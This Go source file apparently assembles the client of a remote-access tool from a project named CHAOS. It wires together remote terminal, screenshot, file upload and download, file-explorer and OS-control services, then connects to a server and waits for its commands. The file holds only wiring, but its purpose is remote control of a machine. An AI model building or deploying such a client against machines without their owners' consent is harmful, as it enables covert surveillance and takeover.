package app

import (
	"github.com/tiagorlampert/CHAOS/client/app/gateway/client"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/download"
	"github.com/tiagorlampert/CHAOS/client/app/services/explorer"
	"github.com/tiagorlampert/CHAOS/client/app/services/information"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"github.com/tiagorlampert/CHAOS/client/app/services/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"net/http"
)

type App struct {
	Handler *handler.Handler
}

func NewApp(httpClient *http.Client, configuration *environment.Configuration) *App {
	clientGateway := client.NewGateway(configuration, httpClient)

	terminalService := terminal.NewTerminalService()
	clientServices := &services.Services{
		Information: information.NewInformationService(configuration.Server.Port),
		Terminal:    terminalService,
		Screenshot:  screenshot.NewScreenshotService(),
		Download:    download.NewDownloadService(configuration, clientGateway),
		Upload:      upload.NewUploadService(configuration, httpClient),
		Explorer:    explorer.NewExplorerService(),
		OS:          os.NewOperatingSystemService(configuration, terminalService),
	}
	return &App{
		Handler: handler.NewHandler(configuration, clientGateway, clientServices),
	}
}

func (app *App) Run() {
	go app.Handler.ConnectWithServer()
	app.Handler.HandleServerRequest()
}
